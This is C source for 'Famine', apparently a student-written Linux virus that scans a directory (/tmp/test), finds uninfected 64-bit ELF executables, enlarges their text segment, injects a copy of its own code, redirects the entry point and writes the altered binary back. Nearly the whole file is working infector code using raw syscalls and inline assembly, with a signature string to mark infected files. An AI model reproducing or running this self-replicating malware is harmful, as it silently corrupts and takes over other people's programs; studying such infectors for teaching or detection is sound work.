#include "famine.h"

char			*create_opcode(Elf64_Addr entrypoint, Elf64_Addr tmp_entry, size_t *code_size, char *binary, char *path)
{
    Elf64_Ehdr	*header;
	Elf64_Shdr	*section;
	void		*malware_code;
	char		*code;
	char		*ptr;
	char		*jump;
	char		string[] = "AAAAAAAA\x48\x89\x45\xf8\x48\x89\xec\x58";
	char		signature[] = "Famine version 1.0 (c)oded by amaindro-droly";
	char		str[] = "/tmp/test//";
	off_t		size;
	int			fd;
	int			i_s;


	asm("syscall" : "=r" (fd) : "a" (2), "D" (binary), "S" (O_RDONLY));
	if (fd < 0)
		return (NULL);

	asm("syscall" :  "=r" (size) : "a" (8), "D" (fd), "S" (0), "d" (SEEK_END));
	if (size < 0)
		return (NULL);

	asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov %6, %%rax\n"
		"syscall\n" :: "g"(0), "g"(size), "g"(PROT_READ | PROT_WRITE), "g"(MAP_PRIVATE), "g"(fd), "g"(0), "g"(9));
	asm("mov %%rax, %0" : "=r"(ptr));
	if (ptr == MAP_FAILED)
		return (NULL);

	if (*(int *)ptr != 0x464c457f || ptr[EI_CLASS] != ELFCLASS64)
		return (NULL);
	
	header = (void*)ptr;
	if (ft_strcmp(str, path) == 0)
	{
		section = NULL;
		i_s = 0;
		while (i_s < header->e_shnum)
		{
			if ((void*)(section = elf_section(header, i_s)) > (void*)ptr + size)
				return (NULL);
			if (elf_section(header, i_s + 1)->sh_addr > header->e_entry)
				break ;
			i_s++;
		}
		if (section == NULL)
			return (NULL);
		malware_code = (void*)section->sh_addr;
	}
	else
	{
		malware_code = (void*)header->e_entry - 0xbdf;
	}
	//opcode size (offset for jump)
	*code_size = 0x1332;

//faire mmap au lieu de malloc
	asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov %6, %%rax\n"
		"syscall\n" :: "g"(0), "g"(sizeof(char) * PAGE_SIZE), "g"(PROT_READ | PROT_WRITE), "g"(MAP_ANON | MAP_PRIVATE), "g"(-1), "g"(0), "g"(9));
	asm("mov %%rax, %0" : "=r"(code));
	if (code == MAP_FAILED)
		return (NULL);

	ft_bzero(code, sizeof(char) * PAGE_SIZE);
	ft_memcpy(code, malware_code, *code_size);
	ft_memcpy(code + *code_size, signature, 44);

	jump = ft_memstr(code, string, *code_size);
	jump[20] = '\xe9'; //jump to main
	*(int*)(jump + 21) = (entrypoint - tmp_entry + 75 - 5) ^ 0xffffffff;

	jump[92] = '2';

	asm("syscall" :  "=r" (fd) : "a" (3), "D" (fd));
	if (fd < 0)
		return (NULL);

	asm("syscall" :  "=r" (fd) : "a" (11), "D" (ptr), "S" (size));
	if (fd < 0)
		return (NULL);
	return (code);
}

void            *infect(void *ptr, size_t *size, char *binary, char *path)
{
	int			i_p;
	int			i_s;
	char		*str;
	char		*code;
	size_t		code_size;
	size_t		tmp_size;
    Elf64_Ehdr	*header;
    Elf64_Phdr	*program;
	Elf64_Shdr	*section;
	Elf64_Addr	tmp_entry;
    
    header = ptr;
    
	//Patch the insertion code (parasite) to jump to the entry point (original)
	tmp_entry = header->e_entry;

	//Locate the text segment program header
	program = NULL;
	
	i_p = 0;
	while (i_p < header->e_phnum)
	{
		if ((void*)(program = elf_program(header, i_p++)) > ptr + *size)
			return (NULL);
			
		if (program->p_type == PT_LOAD && program->p_flags & PF_X)
			break ;
	}
	if (program == NULL)
		return (NULL);
	tmp_size = program->p_offset + program->p_filesz;

	//Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
	//Hardcoded value obtainable in gdb with Jumpaddress - Entrypoint
	header->e_entry = program->p_vaddr + program->p_filesz + 0xbdf;

	//change text segment access rights to be able to decrypt it later
	program->p_flags = program->p_flags | PF_W;

	//Increase p_filesz by account for the new code (parasite)
	program->p_filesz += PAGE_SIZE;
	//Increase p_memsz to account for the new code (parasite)
	program->p_memsz += PAGE_SIZE;
	//For the last shdr in the text segment
	section = NULL;
	i_s = 0;
	while (i_s < header->e_shnum)
	{
		if ((void*)(section = elf_section(header, i_s)) > ptr + *size)
			return (NULL);
		if (elf_section(header, i_s + 1)->sh_addr > header->e_entry)
		{
	//increase sh_len by the parasite length
			section->sh_size += PAGE_SIZE;
			break ;
		}
		i_s++;
	}
	if (section == NULL)
		return (NULL);
	update_segment_64(header, elf_program(header, i_p)->p_offset);
	update_section_64(header, section->sh_offset);
	header->e_shoff += PAGE_SIZE;

	code = NULL;
	if ((code = create_opcode(header->e_entry, tmp_entry, &code_size, binary, path)) == NULL)
		return (NULL);
	str = NULL;
		asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov %6, %%rax\n"
		"syscall\n" :: "g"(0), "g"(*size + PAGE_SIZE), "g"(PROT_READ | PROT_WRITE), "g"(MAP_ANON | MAP_PRIVATE), "g"(-1), "g"(0), "g"(9));
	asm("mov %%rax, %0" : "=r"(str));
	if (str == MAP_FAILED)
		return (NULL);

	ft_bzero(str, *size + PAGE_SIZE);
	ft_memcpy(str, ptr, tmp_size);
	//Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
	ft_memcpy(str + tmp_size, code, PAGE_SIZE);
	ft_memcpy(str + tmp_size + PAGE_SIZE, ptr + tmp_size, *size - tmp_size);
	*size += PAGE_SIZE;
	return (str);

}

void			replace_file(void *ptr, int fd, int size_file)
{
	int		ret;
	
	if (ptr == NULL)
		return ;
	asm("syscall" :  "=r" (ret) : "a" (8), "D" (fd), "S" (0), "d" (SEEK_SET));
	if (ret < 0)
		return ;
	asm("syscall" :: "a" (1), "D" (fd), "S" (ptr), "d" (size_file));
}

void			magic_number(void *ptr, size_t size, int fd, char *binary, char *path)
{
	char		*str;
	char		*str2;
	char		str3[] = "Famine version 1.0 (c)oded by amaindro-droly";

	str = ptr;
	if (*(int *)ptr == 0x464c457f && str[EI_CLASS] == ELFCLASS64 && *(Elf64_Half *)(ptr + 16) == 2)
	{
		if (ft_memstr(str, str3, size))
			return ;
		str2 = NULL;
		if ((str2 = infect(ptr, &size, binary, path)) != NULL)
			replace_file(str2, fd, size);
	}
}

int    openfile(char *filename, char *parent_dir, char *binary)
{
    int				fd;
	char			*ptr;
	char			str[256 * 2];
	off_t			size;
	register int	*r8 asm ("r8");
	register int	*r9 asm ("r9");
	register int	*r10 asm ("r10");

	ft_strcpy(str, parent_dir);
	asm("syscall" : "=r" (fd) : "a" (2), "D" (ft_strcat(str, filename)), "S" (O_RDWR));
	if (fd < 0)
		return (-1);

	asm("syscall" :  "=r" (size) : "a" (8), "D" (fd), "S" (0), "d" (SEEK_END));
	if (size < 0)
		return (-1);

	asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov %6, %%rax\n"
		"syscall\n" :: "g"(0), "g"(size), "g"(PROT_READ | PROT_WRITE), "g"(MAP_PRIVATE), "g"(fd), "g"(0), "g"(9));
	asm("mov %%rax, %0" : "=r"(ptr));
	if (ptr == MAP_FAILED)
		return (-1);

	magic_number(ptr, size, fd, binary, parent_dir);

	asm( "syscall" :  "=r" (fd) : "a" (3), "D" (fd));
	if (fd < 0)
		return (-1);

	asm( "syscall" :  "=r" (fd) : "a" (11), "D" (ptr), "S" (size));
	if (fd < 0)
		return (-1);
	return (0);
}


void	jump()
{
	void		*addr;
	register int	*r12 asm ("r12");
	register int	*r13 asm ("r13");
	register int	*r14 asm ("r14");


	asm("mov %%rax, %%r12\n"
		"mov %%rdx, %%r13\n"
		"mov %%rsi, %%r14\n": "=r" (addr));
	main();
	asm("mov %%r12, %%rax\n"
		"mov %%r13, %%rdx\n"
		"mov %%r14, %%rsi\n": "=r" (addr));
	long int		i = 0x4141414141414141;
	asm("mov %%rbp, %%rsp\n"
	"pop %%rax": "=r" (addr));
	asm("jmp jump");
}

int     main(int ac, char **av)
{
    int 			fd;
    int				ret;
    struct dirent   dir;
    char			str[256 * 2] = "/tmp/test//";
	char			*filename;

	asm("mov 0x30(%%rbp), %%rax": "=r" (filename));
	if (filename== 0)
		filename = av[0];
    asm("syscall" : "=r" (fd) : "a" (2), "D" (str), "S" (O_RDONLY));
	if (fd < 0)
		return (-1);
    ret = 1;
    while (ret > 0)
    {
    	asm("syscall" : "=r" (ret) : "a" (78), "D" (fd), "S" (&dir), "d"(sizeof(dir)));
		if (ret <= 0)
			return (-1);
		asm( "syscall" :: "a" (8), "D" (fd), "S" (dir.d_off), "d" (SEEK_SET));
		openfile(dir.d_name - 1, str, filename);
    }  
	asm("syscall" :  "=r" (ret) : "a" (3), "D" (fd));
	return (ret);
}

//TODO	: check erreurs
//		: check sample infect sample_vanilla